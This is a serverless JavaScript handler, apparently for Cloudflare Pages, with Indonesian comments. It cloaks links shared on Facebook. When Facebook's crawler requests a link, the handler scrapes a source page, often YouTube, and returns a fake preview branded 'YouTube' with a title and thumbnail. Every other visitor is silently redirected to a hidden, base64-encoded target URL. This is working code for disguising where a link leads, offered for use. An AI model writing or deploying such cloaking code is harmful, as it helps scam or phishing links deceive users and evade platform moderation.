export async function onRequest(context) {
  const { request, params } = context;
  const ua = request.headers.get("user-agent") || "";
  const fullPath = params.path ? params.path.join('/') : "";

  if (!fullPath || fullPath === "index.html") return context.next();

  try {
    const [sEnc, uEnc] = fullPath.split('.');
    const sourceUrl = atob(sEnc.replace(/-/g, '+').replace(/_/g, '/'));
    const targetUrl = atob(uEnc.replace(/-/g, '+').replace(/_/g, '/'));

    if (ua.includes("facebookexternalhit") || ua.includes("Facebot")) {
      // Timeout 4 detik agar FB tidak "Loading" kelamaan
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 4000);

      try {
        const response = await fetch(sourceUrl, {
          headers: { "User-Agent": "facebookexternalhit/1.1" },
          signal: controller.signal
        });
        const html = await response.text();
        clearTimeout(timeout);

        const getMeta = (p) => {
          const m = html.match(new RegExp(`<meta[^>]*?(?:property|name)=["'](?:og:)?${p}["'][^>]*?content=["']([^"']*)["']`, "i"));
          return m ? m[1] : "";
        };

        let title = getMeta("title") || "Video";
        let desc = getMeta("description") || "Tonton selengkapnya...";
        let img = getMeta("image") || "";

        if (sourceUrl.includes("youtube.com") || sourceUrl.includes("youtu.be")) {
          let vId = sourceUrl.includes("v=") ? sourceUrl.split("v=")[1].split("&")[0] : sourceUrl.split("/").pop().split("?")[0];
          img = `https://i.ytimg.com/vi/${vId}/maxresdefault.jpg`;
        }

        return new Response(`<!DOCTYPE html><html><head>
          <meta charset="UTF-8">
          <meta property="og:site_name" content="YouTube">
          <meta property="og:title" content="${title}">
          <meta property="og:description" content="${desc}">
          <meta property="og:image" content="${img}">
          <meta property="og:type" content="video.other">
          <meta name="twitter:card" content="summary_large_image">
          <meta name="twitter:image" content="${img}">
        </head><body></body></html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
      } catch (e) {
        // Jika scraping gagal/timeout, kasih template standar agar tidak kosong
        return new Response(`<!DOCTYPE html><html><head><meta property="og:title" content="Video Viral Terbaru"><meta name="twitter:card" content="summary_large_image"></head></html>`, { headers: { "content-type": "text/html" } });
      }
    }
    return Response.redirect(targetUrl, 302);
  } catch (e) {
    return context.next();
  }
}
